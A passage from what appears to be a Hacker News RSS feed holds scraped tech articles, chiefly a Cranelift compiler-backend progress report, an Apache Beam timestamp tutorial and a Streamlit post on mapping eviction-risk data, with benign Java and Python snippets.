<p>Let’s complicate things a little bit. Instead of using a typewriter, you are writing with a pen. From time to time, your pen will slip and make an ugly mark. How many ugly marks will you get per page? Again, the map has you covered: this time, instead of having <em>n</em> discrete button presses, we have an infinite number of infinitesimal opportunities for the pen to screw up, so <span data-katex-display="false">n\to\infty</span>, and <em>p </em>must also become infinitesimally small so that <em>np</em> is finite, otherwise you would just be making an infinite number of ugly marks, and I know you are better than that. Thus, according to the map, the number of screwups per page follows a Poisson distribution. A handy property of the Poisson distribution is that the mean happens to be equal to the variance. So if your pen screws up 10 times per page, you also know the variance will be 10.</p>



<p>You can go on and explore the map on your own (riddle: what is the amount of ink deposited by your pen per page distributed like?). So far, I would say I have encountered only half of the map’s distributions in real life, so there is still a lot of <em>terra incognita</em> for me.</p>
	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://www.telescopic-turnip.net/cookbooks/the-map-of-randomness/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687087</guid>
            <pubDate>Fri, 08 Jan 2021 17:23:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Progress Report on Rustc_codegen_cranelift]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687051">thread link</a>) | @est31
<br/>
January 8, 2021 | https://bjorn3.github.io/2021/01/07/progress-report-dec-2020.html | <a href="https://web.archive.org/web/*/https://bjorn3.github.io/2021/01/07/progress-report-dec-2020.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><a href="https://github.com/bjorn3/rustc_codegen_cranelift">Rustc_codegen_cranelift</a> (cg_clif) is an alternative backend for rustc that I have been working on for the past two years. It uses the Cranelift code generator. Unlike LLVM which is optimized for output quality at the cost of compilation speed even when optimizations are disabled, Cranelift is optimized for compilation speed while producing executables that are almost as fast as LLVM with optimizations disabled. This has the potential to reduce the compilation times of rustc in debug mode.</p>

<p>Since the <a href="https://bjorn3.github.io/2020/09/28/progress-report-sep-2020.html">last progress report</a> there have been <a href="https://github.com/bjorn3/rustc_codegen_cranelift/compare/0c065f95609e28cd3f2ddddccb06bf01705699cb...dbee13661efa269cb4cd57bb4c6b99a19732b484">150 commits</a>.</p>



<h4 id="git-subtree">Git subtree</h4>

<p>In <a href="https://github.com/rust-lang/rust/pull/77975">rust#77975</a> cg_clif was added as git subtree to the main rust repo. This PR makes it possible to compile cg_clif as part of rustc. As already mentioned in <a href="https://bjorn3.github.io/2020/11/01/fixing-rustc-bootstrap-with-cg_clif.html">“Fixing bootstrap of rustc using cg_clif”</a> it is even possible to bootstrap rustc completely using cg_clif without LLVM. All you have to do is add <code>"cranelift"</code> to the <code>codegen-backends</code> array in <code>config.toml</code>. (Or completely replace <code>"llvm"</code> in the array if you don’t want to compile the LLVM backend)</p>

<h4 id="lazy-compilation-in-jit-mode">Lazy compilation in jit mode</h4>

<p>It is now possible to select the lazy jit mode using <code>$cg_clif_dir/build/cargo.sh lazy-jit</code>. In this mode functions are only compiled when they are first called. This has the potential to significantly improve the startup time of a program. While functions have to be codegened when called, it is expected that a significant amount of all code is only required when an error occurs or only when the program is used in certain ways.</p>

<p>Thanks <a href="https://github.com/flodiebold">@flodiebold</a> for the <a href="https://rust-lang.zulipchat.com/#narrow/stream/131828-t-compiler/topic/cranelift.20backend.20work/near/187645798">suggestion</a> back in February.</p>

<p>This mode is not enabled by default as trying to lazily compile a function from a different thread than the main rustc thread will result in an ICE while parallel rustc is not yet enabled by default.</p>

<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime/pull/2249">wasmtime#2249</a>: Rework the interface of cranelift-module</li>
  <li><a href="https://github.com/bytecodealliance/wasmtime/pull/2287">wasmtime#2287</a>: Some SimpleJIT improvements</li>
  <li><a href="https://github.com/bytecodealliance/wasmtime/pull/2390">wasmtime#2390</a>: More SimpleJIT refactorings</li>
  <li><a href="https://github.com/bytecodealliance/wasmtime/pull/2403">wasmtime#2403</a>: SimpleJIT hot code swapping</li>
  <li><a href="https://github.com/bjorn3/rustc_codegen_cranelift/pull/1120">#1120</a>: Lazy compilation in jit mode</li>
</ul>

<h4 id="simd">SIMD</h4>

<p>Several new simd intrinsics have been implemented.</p>

<ul>
  <li>commit <a href="https://github.com/bjorn3/rustc_codegen_cranelift/commit/22c9623604c6366e4783614244372cf1b31f7ca7">22c9623</a>: Implement simd_reduce_{add,mul}_{,un}ordered</li>
  <li>commit <a href="https://github.com/bjorn3/rustc_codegen_cranelift/commit/47ff2e093238c80eb99ee612b8b591bf7adb5526">47ff2e0</a>: Implement float simd comparisons</li>
  <li>commit <a href="https://github.com/bjorn3/rustc_codegen_cranelift/commit/d2eeed4ff577ee35693a32ae95f043f57c267cb3">d2eeed4</a>: Implement more simd_reduce_* intrinsics</li>
  <li>commit <a href="https://github.com/bjorn3/rustc_codegen_cranelift/commit/e99f78af0880edd5f56254236042f3c9ce0dce63">e99f78a</a>: Make simd_extract panic at runtime on non-const index again</li>
  <li>commit <a href="https://github.com/bjorn3/rustc_codegen_cranelift/commit/d95d03ae8ad10f253dce81a62a9ac372835b9bb4">d95d03a</a>: Support #[repr(simd)] on array wrappers</li>
</ul>

<h4 id="runtime-performance">Runtime performance</h4>

<p>A variety of peephole optimizations has been added to cg_clif. Combined this probably resulted in a speedup of ~5%. In addition now that <a href="https://github.com/bytecodealliance/wasmtime/issues/1080">wasmtime#1080</a> has been fixed, it became possible to enable the optimizations of Cranelift itself.</p>

<ul>
  <li>commit <a href="https://github.com/bjorn3/rustc_codegen_cranelift/commit/3f47f938ba5303be9b6fe8c13aee6dce4aaa4b0b">3f47f93</a>: Enable Cranelift optimizations when optimizing</li>
</ul>



<p>While there are several important things currently missing, I am confident that I will be able to implement a significant portion in 2021.</p>

<h4 id="abi-compatibility">ABI compatibility</h4>

<p>There are many remaining ABI incomptibilities. I will need to rework cg_clif to reuse <code>rustc_target::abi::call::FnAbi</code>. I am currently working on a refactoring of the ABI handling code on the rustc side to make this easier. A part of this refactor has already landed.</p>

<ul>
  <li>issue <a href="https://github.com/bjorn3/rustc_codegen_cranelift/issues/10">#10</a>: C abi compatability</li>
  <li><a href="https://github.com/rust-lang/rust/pull/79067">rust#79067</a>: Refactor the abi handling code a bit</li>
</ul>

<h4 id="switch-to-the-new-backend-framework-of-cranelift">Switch to the new backend framework of Cranelift</h4>

<p>Cranelift is currently switching to a new backend framework. This framework produces faster code and has support for AArch64. Currently there is no 128bit integer support for it though, which is necessary to compile libcore. There is however a draft PR by <a href="https://github.com/cfallin">@cfallin</a> that is able to compile cg_clif. There is a miscompilation of simple-raytracer in release mode though. It is currently unknown if it is related to this PR.</p>

<ul>
  <li><a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime/pull/2504">wasmtime#2504</a>: Draft: I128 support (partial) on x64.</li>
</ul>

<h4 id="atomics">Atomics</h4>

<p>Atomic instructions are currently emulated using a global lock. This is very inefficient and only works when pthreads is available. The new style backends for Cranelift have native support for atomic instructions. I will switch to them once I can use the new style backends.</p>

<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime/pull/2077">wasmtime#2077</a>: Implement Wasm Atomics for Cranelift/newBE/aarch64.</li>
  <li><a href="https://github.com/bytecodealliance/wasmtime/pull/2149">wasmtime#2149</a>: This patch fills in the missing pieces needed to support wasm atomics…</li>
</ul>

<h4 id="simd-1">SIMD</h4>

<p>Many vendor intrinsics remain unimplemented. The new portable SIMD project will however likely exclusively use platform intrinsics or which there are much fewer compared to the LLVM intrinsics used to implement all vendor intrinsics in <code>core::arch</code>. In addition platform intrinsics are architecture independent, so they only have to be implemented once.</p>

<ul>
  <li>issue <a href="https://github.com/bjorn3/rustc_codegen_cranelift/issues/171">#171</a>: std::arch SIMD intrinsics</li>
</ul>

<h4 id="cleanup-during-stack-unwinding-on-panics">Cleanup during stack unwinding on panics</h4>

<p>Cranelift currently doesn’t have support for cleanup during stack unwinding.</p>

<ul>
  <li>issue <a href="https://github.com/bytecodealliance/wasmtime/issues/1677">wasmtime#1677</a>: Support cleanup during unwinding</li>
</ul>

<h4 id="windows-support">Windows support</h4>

<p>Various issues</p>

<ul>
  <li>issue <a href="https://github.com/bjorn3/rustc_codegen_cranelift/issues/977">#997</a>: Windows support</li>
  <li>branch <a href="https://github.com/bjorn3/rustc_codegen_cranelift/compare/wip_windows_support">wip_windows_support</a></li>
</ul>

<h4 id="maintenance">Maintenance</h4>

<p>While there have been several PR’s by other people, I am the only person who has contributed more than a few changes to cg_clif.</p>

<ul>
  <li><a href="https://github.com/bjorn3/rustc_codegen_cranelift/pulls?q=is%3Apr+is%3Aclosed+-author%3Aapp%2Fdependabot-preview">https://github.com/bjorn3/rustc_codegen_cranelift/pulls?q=is%3Apr+is%3Aclosed+-author%3Aapp%2Fdependabot-preview</a></li>
</ul>

<p>Thanks to <a href="https://github.com/jyn514">@jyn514</a> for giving feedback on this post.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://bjorn3.github.io/2021/01/07/progress-report-dec-2020.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687051</guid>
            <pubDate>Fri, 08 Jan 2021 17:21:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Review of Modern Sail Theory (1981) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687017">thread link</a>) | @Tomte
<br/>
January 8, 2021 | http://ljjensen.net/Maritimt/A%20Review%20of%20Modern%20Sail%20Theory.pdf | <a href="https://web.archive.org/web/*/http://ljjensen.net/Maritimt/A%20Review%20of%20Modern%20Sail%20Theory.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://ljjensen.net/Maritimt/A%20Review%20of%20Modern%20Sail%20Theory.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687017</guid>
            <pubDate>Fri, 08 Jan 2021 17:19:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apache Beam for Search: Getting Started by Hacking Time]]>
            </title>
            <description>
<![CDATA[
Score 78 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25686936">thread link</a>) | @clandry94
<br/>
January 8, 2021 | https://shopify.engineering/apache-beam-for-search-getting-started-by-hacking-time | <a href="https://web.archive.org/web/*/https://shopify.engineering/apache-beam-for-search-getting-started-by-hacking-time">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>To create relevant search, processing clickstream data is key: you frequently want to promote search results that are being clicked on and purchased, and demote those things users don’t love.</p>
<p>Typically search systems think of processing clickstream data as a batch job run over historical data, perhaps using a system like Spark. But on Shopify’s Discovery team, we ask the question: What if we could auto-tune relevance in real-time as users interact with search results—not having to wait days for a large batch job to run?</p>
<p>At Shopify—this is what we’re doing! We’re using streaming data processing systems that can process both real-time and historic data to enable real-time use cases ranging from simple auto boosting or down boosting of documents, to computing aggregate click popularity statistics, building <a href="https://elasticsearch-learning-to-rank.readthedocs.io/en/latest/core-concepts.html#judgments-expression-of-the-ideal-ordering" target="_blank" rel="nofollow noopener noreferrer">offline search evaluation sets</a>, and on to more complex reinforcement learning tasks.</p>
<p>But this article is introducing you to the streaming system themselves. In particular, to Apache Beam. And the most important thing to think about is <em>time</em> with those streaming systems. So let’s get started!</p>
<h2>What Exactly is Apache Beam?</h2>
<p><a href="https://beam.apache.org/" target="_blank" title="Apache Beam" rel="nofollow noopener noreferrer">Apache Beam</a> is a unified batch and stream processing system. This lets us potentially unify historic and real-time views of user search behaviors in one system. Instead of a batch system, like Spark, to churn over months of old data, and a separate streaming system, like Apache Storm, to process the live user traffic, Beam hopes to keep these workflows together.</p>
<p>For search, this is rather exciting. It means we can build search systems that both rely on historic search logs while perhaps being able to live-tune the system for our users’ needs in various ways.</p>
<p>Let’s walk through an early challenge everyone faces with Beam: that of <strong><em>time!</em></strong> Beam is a kind of time machine that has to reorder events in their right spot after getting annoyingly delayed by lots of intermediate processing and storage step. This is one of the core complications of a streaming system - how long do we wait? How do we deal with late or out of order data?</p>
<p>So to get started with Beam, the first thing you’ll need to do is Hack Time!</p>
<h2>The Beam Time Problem</h2>
<p>At the core of Apache Beam are <a href="https://beam.apache.org/documentation/programming-guide/#creating-a-pipeline" target="_blank" rel="nofollow noopener noreferrer">pipelines</a>. They connect a source through various processing steps to finally a sink.&nbsp;&nbsp;</p>
<p>Data flowing through a pipeline is timestamped. When you consider a streaming system, this makes sense. We have various delays as events flow from browsers, through APIs, and other data systems. Finally the events arrive at our Beam pipeline. They can easily be out-of-order or delayed. Beam source APIs, like the one for <a href="https://beam.apache.org/releases/javadoc/2.5.0/org/apache/beam/sdk/io/kafka/KafkaIO.html" target="_blank" rel="nofollow noopener noreferrer">Kafka</a>, maintain a moving view of the event data to emit well-ordered events known as a <a href="https://beam.apache.org/documentation/programming-guide/#watermarks-and-late-data" target="_blank" rel="nofollow noopener noreferrer">watermark</a>.</p>
<p>If we don’t give our Beam source good information on how to build a timestamp, we’ll drop events or receive them in the wrong order. But even more importantly for search, we likely must combine different streams of data to build a single view on a search session or query, like below:</p>
<figure><img alt="combine different streams of data to build a single view on a search session or query, like below" data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/Beam_for_Search__Getting_started_with_the_Beam_time_machine.png?format=jpg&amp;quality=90&amp;v=1610128718" src="https://cdn.shopify.com/s/files/1/0779/4361/files/Beam_for_Search__Getting_started_with_the_Beam_time_machine.png?format=jpg&amp;quality=90&amp;v=1610128718"></figure>
<p>Joining (a Beam topic for another day!) needs to look back over each source’s watermark and ensure they’re aligned in time before deciding that sufficient time has elapsed before moving on. But before you get to the complexities of streaming joins, replaying with accurate timestamps is the first milestone on your Beam-for-clickstream journey.</p>
<h2>Configuring the Timestamp Right at the Source</h2>
<p>Let’s set up a simple Beam pipeline to explore Beam. Here we’ll use Kafka in Java as an example. You can see the full source code <a href="https://gist.github.com/geekigirl/738ead73033ae673483ab9690452f10f" target="_blank" title="Timestamp policy example with Kafka source with Apache BEAM" rel="nofollow noopener noreferrer">in this gist</a>.</p>
<p>Here we’ll set up a Kafka source, the start of a pipeline producing a custom SearchQueryEvent stored in a search_queries_topic.</p>

<p>You’ll notice we have information on the topic/servers to retrieve the data, along with how to deserialize the underlying binary data. We might add further processing steps to transform or process our SearchQueryEvents, eventually sending the final output to another system.</p>
<p>But nothing about <strong>time</strong> yet. By default, the produced SearchQueryEvents will use Kafka <em>processing</em> time. That is, when they’re read from Kafka. This is the least interesting for our purposes. We care about when users actually searched and clicked on results.</p>
<p>More interesting is when the event was created in a Kafka client. Which we can add here:</p>
<p><code>.withCreateTime(Duration.<em>standardMinutes</em>(5))</code></p>
<p>You’ll notice above, when we use create time below, we need to give the source’s Watermark a tip for how out of order event times might be. For example, below we instruct the Kafka source to use create time, but with a possible 5 minutes of discrepancy.&nbsp;</p>
<h2>Appreciating The Beam Time Machine</h2>
<p>Let’s reflect on what such a 5 minute possible delay actually means from the last snippet. Beam is kind of a time machine… How Beam bends space-time is where your mind can begin to hurt.</p>
<p>As you might be picking up, <em>event time </em>&nbsp;is quite different from <em>processing time</em>! So in the code snippet above, we’re *not* telling the computer to wait for 5 minutes of execution time for more data. No, the event time might be replayed from historical data, where 5 minutes of event time is replayed through our pipeline in mere milliseconds. Or it could be event time is really now, and we’re actively streaming live data for processing. So we DO indeed wait 5 real minutes!&nbsp;</p>
<p>Let’s take a step back and use a silly example to understand this. It’s really crucial to your Beam journey.&nbsp;</p>
<p>Imagine we’re super-robot androids that can watch a movie at 1000X speed. Maybe like Star Trek The Next Generation’s Lt Commander Data. If you’re unfamiliar, he could process input as fast as a screen could display! Data might say “Hey look, I want to watch the classic 80s movie, The Goonies, so I can be a cultural reference for the crew of the Enterprise.”&nbsp;</p>
<p>Beam is like watching a movie in super-fast forward mode with chunks of the video appearing possibly delayed or out of order relative to other chunks in movie time. In this context we have two senses of time:</p>
<ul>
<li>Event Time: the timestamp in the actual 1h 55 minute runtime of The Goonies aka movie time.</li>
<li>Processing Time: the time we actually experience The Goonies (perhaps just a few minutes if we’re super-robot androids like Data).</li>
</ul>
<p>So Data tells the Enterprise computer “Look, play me The Goonies as fast as you can recall it from your memory banks.” And the computer has various hiccups where certain frames of the movie aren’t quite getting to Data’s screen to keep the movie in order.&nbsp;</p>
<p>Commander Data can tolerate missing these frames. So Data says “Look, don’t wait more than 5 minutes in *movie time* (aka event time) before just showing me what you have so far of that part of the movie. This lets Data watch the full movie in a short amount of time, dropping a tolerable number of movie frames.</p>
<p>This is just what Beam is doing with our search query data. Sometimes it’s replaying days worth of historic search data in milliseconds, and other times we’re streaming live data where we truly must wait 5 minutes for reality to be processed. Of course, the right delay might not be 5 minutes, it might be something else appropriate to our needs.&nbsp;</p>
<p>Beam has other primitives such as <a href="https://beam.apache.org/releases/javadoc/2.0.0/org/apache/beam/sdk/transforms/windowing/Window.html" target="_blank" rel="nofollow noopener noreferrer">windows</a> which further inform, beyond the source, how data should be buffered or collected in units of time. Should we collect our search data in daily windows? Should we tolerate late data? What does subsequent processing expect to work over? Windows also work with the same time machine concepts that must be appreciated deeply to work with Beam.</p>
<h2>Incorporating A Timestamp Policy</h2>
<p>Beam might know a little about Kafka, but it really doesn’t know anything about <strong>our</strong> data model. Sometimes we need even more control over the definition of time in the Beam time machine.</p>
<p>For example, in our previous movie example, movie frames perhaps have some field informing us of how they should be arranged in movie time. If we examine our SearchQueryEvent, we also see a specific timestamp embedded in the data itself:</p>
<p><code>public class SearchQueryEvent {</code></p>
<p><code>&nbsp;&nbsp;&nbsp;public final String queryString;</code></p>
<p><code>&nbsp;&nbsp;&nbsp;public final Instant searchTimestamp;</code></p>
<p><code>…</code></p>
<p><code>}</code></p>
<p>Well Beam sources can often be configured to use a custom event time like our searchTimestamp. We just need to make a TimestampPolicy. We simply provide a simple function-class that takes in our record (A key-value of Long-&gt;SearchQueryEvent) and returns a timestamp:</p>

<p>We can use this to create our own timestamp policy:</p>

<p>Here, we’ve passed in our own function, and we’ve given the same allowed delay (5 minutes). This is all wrapped up in a factory class TimestampPolicyFactory SearchQueryTimestampPolicyFactory (now if that doesn’t sound like a Java class name, I don’t know what does ;) )</p>
<p>We can add our timestamp policy to the builder:</p>
<p><code>.withTimestampPolicyFactory(new SearchQueryTimestampPolicyFactory())</code></p>
<h2>Hacking Time!</h2>
<p>Beam is about hacking time, I hope you’ve appreciated this walkthrough of some of Beam’s capabilities. If you’re interested in joining me on building Shopify’s future in search and discovery, please check out these great job postings!</p>
<p>Doug Turnbull is a Sr. Staff Engineer in Search Relevance at Shopify. He is known for writing the book “Relevant Search”, contributing to “AI Powered Search”, and creating relevance tooling for Solr and Elasticsearch like Splainer, Quepid, and the Elasticsearch Learning to Rank plugin. Doug’s team at Shopify helps Merchants make their products and brands more discoverable. If you’d like to work with Doug, send him a Tweet at <a href="https://twitter.com/softwaredoug" target="_blank" title="Doug Turnbull on Twitter" rel="nofollow noopener noreferrer">@softwaredoug</a>!</p>
</div></div>]]>
            </description>
            <link>https://shopify.engineering/apache-beam-for-search-getting-started-by-hacking-time</link>
            <guid isPermaLink="false">hacker-news-small-sites-25686936</guid>
            <pubDate>Fri, 08 Jan 2021 17:13:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Arup and New Story use data to help combat pandemic related evictions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25686780">thread link</a>) | @TCR19
<br/>
January 8, 2021 | https://blog.streamlit.io/open-source-eviction-data/ | <a href="https://web.archive.org/web/*/https://blog.streamlit.io/open-source-eviction-data/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            <header>

                <section>
                    <a href="https://blog.streamlit.io/tag/community/">Community</a>
                </section>

                

                <p>Making data accessible to help address the eviction crisis</p>
            </header>

            <figure>
                <img srcset="https://blog.streamlit.io/content/images/size/w300/2021/01/Arup2-2.gif 300w,
                            https://blog.streamlit.io/content/images/size/w600/2021/01/Arup2-2.gif 600w,
                            https://blog.streamlit.io/content/images/size/w1000/2021/01/Arup2-2.gif 1000w,
                            https://blog.streamlit.io/content/images/size/w2000/2021/01/Arup2-2.gif 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.streamlit.io/content/images/size/w2000/2021/01/Arup2-2.gif" alt="Arup and New Story use data to help combat pandemic related evictions">
            </figure>

            <section>
                <div>
                    <p><em><em>Written by </em>Jared Stock,<em> </em>a digital consultant at Arup.</em></p><p>One of the many consequences of COVID-19 in the US is that countless families are having trouble keeping up with rent. <a href="https://www.washingtonpost.com/business/2020/12/07/unemployed-debt-rent-utilities/">According to Moody’s</a>, nearly 12 million renters will owe an average of $5,850 in back rent by January 2021. These renters will face the terrifying prospect of losing their homes in the middle of winter during a pandemic. </p><p>In early September, the Centers for Disease Control issued a national moratorium on evictions until December 31st, 2020. Under this order, tenants can provide a declaration to their landlord that shows that they meet certain conditions, which then prevents the landlord from evicting them. However, <a href="https://www.federalregister.gov/documents/2020/09/04/2020-19654/temporary-halt-in-residential-evictions-to-prevent-the-further-spread-of-covid-19">as the CDC notes</a> in the order, “this Order does not relieve any individual of any obligation to pay rent, make a housing payment, or comply with any other obligation…” So, while tenants were protected until then, their rent payments continued to accumulate and they could face eviction if they aren’t able to pay all of the rent back. </p><p>One way to help these families is to simply pay their rent, and that’s exactly what <a href="https://newstorycharity.org/">New Story</a>, a charity based in the Bay Area, set out to do in the spring of 2020. Our team at Arup helped New Story analyze data in the Bay Area to help them make decisions about how to distribute direct payments to families. We looked at a variety of data sources ranging from economic indicators to how vulnerable a county was to COVID-19. We were able to come up with a relative risk index that we used to compare counties and show where the greatest need was. After that work was done, the next logical step was to <a href="https://share.streamlit.io/arup-group/social-data/run.py">share our code and data</a> with the community. </p><p>While some NGOs have people with software and data experience, many more don’t have the skills required to use the open data that exists. Our goal is to make that data and the analysis that we’ve done around evictions available to as many people as possible to help drive decisions and ultimately keep more people in their homes.</p><h2 id="empowering-users-no-code-required">Empowering users, no code required</h2><p>When we initially published our repository and data, users had to have some coding experience in order to use it - which can be intimidating! That immediately reduced the number of people who could potentially use the data. This was a clear opportunity to use <a href="https://www.streamlit.io/">Streamlit</a> to make the data accessible to everyone without needing to understand SQL queries or how to run Python code. Since our initial release was just vanilla Python code, it was easy to start adding functionality by just marking up our code with Streamlit functions. We were able to adapt our existing Python workflows in just a couple hours and deploy using Streamlit sharing in just a couple minutes. </p><figure><img src="https://blog.streamlit.io/content/images/2021/01/Screen-Shot-2021-01-05-at-11.35.44-PM.png" alt="" srcset="https://blog.streamlit.io/content/images/size/w600/2021/01/Screen-Shot-2021-01-05-at-11.35.44-PM.png 600w, https://blog.streamlit.io/content/images/size/w1000/2021/01/Screen-Shot-2021-01-05-at-11.35.44-PM.png 1000w, https://blog.streamlit.io/content/images/size/w1600/2021/01/Screen-Shot-2021-01-05-at-11.35.44-PM.png 1600w, https://blog.streamlit.io/content/images/size/w2400/2021/01/Screen-Shot-2021-01-05-at-11.35.44-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Right off the bat, we were able to turn what were originally command line prompts into visual inputs for users that update as they go through the process. Since this analysis follows a linear sequence of user inputs, Streamlit inputs allow for a much better user experience and allow us to show data at various steps during the analysis in a much nicer format than writing to a command line. We also provide explanation and details right alongside the inputs and data, rather than in a separate README file. </p><p>Streamlit’s input components allowed us to give users a lot more control over what they want to analyze. Instead of making assumptions about housing stock distributions or what features are important to risk, we could surface those assumptions to the user so they could make their own decisions. This level of transparency and control was the inspiration for the other page in the <a href="https://share.streamlit.io/arup-group/social-data/run.py">app</a>: the Data Explorer. </p><figure><img src="https://blog.streamlit.io/content/images/2021/01/Screen-Shot-2021-01-05-at-11.37.22-PM.png" alt="" srcset="https://blog.streamlit.io/content/images/size/w600/2021/01/Screen-Shot-2021-01-05-at-11.37.22-PM.png 600w, https://blog.streamlit.io/content/images/size/w1000/2021/01/Screen-Shot-2021-01-05-at-11.37.22-PM.png 1000w, https://blog.streamlit.io/content/images/size/w1600/2021/01/Screen-Shot-2021-01-05-at-11.37.22-PM.png 1600w, https://blog.streamlit.io/content/images/size/w2400/2021/01/Screen-Shot-2021-01-05-at-11.37.22-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>This page is meant to give the users the ability to dive into the data in more detail - allowing a user to look at the values of a single feature in the database and compare the values of two different features. Users can also download the raw data as an Excel document and do whatever they want with it. We’re hoping to add more flexibility to this page in the future, like being able to compare counties in multiple different states. If you have ideas you’d like to see implemented, please add a feature request or better yet, contribute a pull request on our <a href="https://github.com/arup-group/social-data">GitHub</a>.</p><h2 id="mapping-it-out">Mapping it out</h2><p>We’ve found that the clearest way for people to understand comparative risk between counties is with a map. Streamlit already has support for simple maps, however, we didn’t just want to plot points; we wanted to show the county shapes. County shapefiles are common and we could get them into our database relatively easily using PostGIS. They get stored in a format called Well Known Binary (WKB), so we need to get them into a format that can be read by pydeck. &nbsp;</p><p>First, I load in the geometry data using Shapely with <code>shapely.wkb.loads()</code>. But immediately we have a problem: the data comes in as a Well Known Text (WTK) object, not as geojson that we can parse. GIS isn't my specialty, so like a good programmer, I looked around Stack Overflow and eventually found some snippets that convert it into sets of coordinates that Python could parse as a dict and then clean it up a bit.</p><figure><pre><code>geo_df['geom'] = geo_df.apply(lambda row: row['geom'].buffer(0), axis=1)
geo_df['geom'] = geo_df.apply(lambda row: gpd.GeoSeries(row['geom']).__geo_interface__, axis=1)
geo_df['coordinates'] = geo_df.apply(lambda row: clean_coordinates(row), axis=1)</code></pre><figcaption>I later found <a href="https://gist.github.com/drmalex07/5a54fc4f1db06a66679e">a better way to do this</a> using Shapely</figcaption></figure><pre><code>def clean_coordinates(row: pd.Series) -&gt; list:
    # combine multipolygon into one object as a single polygon
    for f in row['geom']['features']:
        if f['geometry']['type'] == 'MultiPolygon':
            f['geometry']['type'] = 'Polygon'
            combined = []
            for i in range(len(f['geometry']['coordinates'])):
                combined.extend(list(f['geometry']['coordinates'][i]))
            f['geometry']['coordinates'] = combined

        # flatten coordinates
        f['geometry']['coordinates'] = f['geometry']['coordinates'][0]
    return row['geom']</code></pre><p>Now we have coordinates that define each shape! I add those to our DataFrame and then I can turn everything into nice, friendly geojson for our map. I create a feature collection with each county's name, shape coordinates, and the values (in our case just one) that we want to display.</p><figure><pre><code>def make_geojson(geo_df: pd.DataFrame, features: list) -&gt; dict:
    geojson = {"type": "FeatureCollection", "features": []}
    for i, row in geo_df.iterrows():
        feature = row['coordinates']['features'][0]
        props = {"name": row['County Name']}
        for f in features:
            props.update({f: row[f]})
        feature["properties"] = props
        del feature["id"]
        del feature["bbox"]
        feature["geometry"]["coordinates"] = [feature["geometry"]["coordinates"]]
        geojson["features"].append(feature)

    return geojson</code></pre><figcaption>This function creates a new geojson object with our data and the specific features/columns that we want to display</figcaption></figure><p>Now we can finally show this data in our Streamlit app. In this case, I want to give pydeck a DataFrame with only what we want to show on the map. I turn this geojson into a DataFrame and add fill colors as another column, and then I can create a layer for our shapes and pass that into the <code>st.pydeck_chart()</code> function along with a tooltip to show the value of the feature.</p><pre><code>    polygon_layer = pdk.Layer(
        "PolygonLayer",
        geo_df,
        get_polygon="coordinates",
        filled=True,
        stroked=False,
        opacity=0.5,
        get_fill_color='fill_color',
        auto_highlight=True,
        pickable=True,
    )
    # The brackets here are expected for pdk, so string formatting is less friendly
    tooltip = {"html": "&lt;b&gt;County:&lt;/b&gt; {name} &lt;/br&gt;" + "&lt;b&gt;" + str(map_feature) + ":&lt;/b&gt; {" + str(map_feature) + "}"}

    r = pdk.Deck(
        layers=[polygon_layer],
        initial_view_state=view_state,
        map_style=pdk.map_styles.LIGHT,
        tooltip=tooltip
    )
    st.pydeck_chart(r)</code></pre><p>Once our data is properly formatted, turning it into a map is pretty straightforward:</p><figure><img src="https://blog.streamlit.io/content/images/2021/01/Screen-Shot-2021-01-05-at-11.41.06-PM.png" alt="" srcset="https://blog.streamlit.io/content/images/size/w600/2021/01/Screen-Shot-2021-01-05-at-11.41.06-PM.png 600w, https://blog.streamlit.io/content/images/size/w1000/2021/01/Screen-Shot-2021-01-05-at-11.41.06-PM.png 1000w, https://blog.streamlit.io/content/images/size/w1600/2021/01/Screen-Shot-2021-01-05-at-11.41.06-PM.png 1600w, https://blog.streamlit.io/content/images/size/w2400/2021/01/Screen-Shot-2021-01-05-at-11.41.06-PM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>And now we have our data flowing into a nice map!</figcaption></figure><p>Because the functions to create the map are generalized, it makes expanding on them much easier. For example, if we want to create a map with multiple layers, we could update the existing <code>make_map</code> function to accept a list of features to map and then create multiple of <code>Layer</code>s instead of just one. We can use these functions like a component in React or Angular to show different information in multiple places. In fact, I did exactly that to create map view on the Data Explorer page to allow users to see any feature by just changing the inputs to the functions.</p><h2 id="making-data-accessible">Making data accessible</h2><p>This project initially aimed to collect disparate data sources and make our analysis easier for anyone, but not everyone has the Python and data skills to use it on its own. Streamlit allowed us to replace a scary command line interface with a more familiar and functional web app, hopefully allowing more users to interact with data. It also gave us the ability to show the data in more interactive and intuitive ways than we could if users had to run the project locally. While we hope this will help people address the eviction crisis, we think this data also can help address other social problems in policy-making, planning, and other fields. </p><p>Arup decided to make this project open because we believe we can have a bigger impact 